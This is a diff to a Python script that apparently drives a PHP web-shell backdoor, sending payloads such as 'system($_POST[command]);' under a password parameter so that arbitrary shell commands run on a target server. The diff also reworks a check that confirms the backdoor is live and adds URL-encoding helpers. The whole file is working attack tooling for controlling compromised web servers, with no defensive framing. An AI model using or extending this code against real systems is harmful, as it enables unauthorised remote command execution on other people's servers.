@@ -5,6 +5,7 @@ import requests
 import random
 import string
 import sys
+import urllib
 
 
 '''
@@ -36,11 +37,9 @@ def init(url, method, auth):
 def shell_exec(url, method, auth, command):
     # system, exec, shell_exec, popen, proc_open, passthru
     if method == "POST":
-        print "[POST]"
         data = {auth:"system($_POST[command]);",  "command":command}
         response = requests.post(url, data=data)
     elif method == "GET":
-        print "[GET]"
         params = {auth:"system($_GET[command]);", "command":command}
         response = requests.get(url, params=params)
     else:
@@ -79,14 +78,27 @@ def check_working(url, method, auth):
         data = {auth:'var_dump("$_POST[%s]");' % (key), key:value}
         response = requests.post(url, data=data)
     elif method == "GET":
-        params = {auth:'var_dump("$_GET[%s]");' % (key), key:value}
-        response = requests.get(url, params=params)
+        params = {auth:'var_dump("$_POST[%s]");' % key}
+        url = build_url(url, params)
+        data = {key:value}
+        response = requests.post(url, data=data)
     else:
         return "Not supported method!"
     content = response.content
-    print content
-    print response.status_code
     return value in content
+
+def url_encode(word):
+    return urllib.quote(word)
+
+def url_decode(word):
+    return urllib.unquote(word)
+
+def build_url(url, params):
+    if not url.endswith("?"):
+        url += "?"
+    for key,value in params.items():
+        url += "%s=%s&" % (key, url_encode(value))
+    return url[0:-1]
 
 def main():
     if len(sys.argv) != 4:
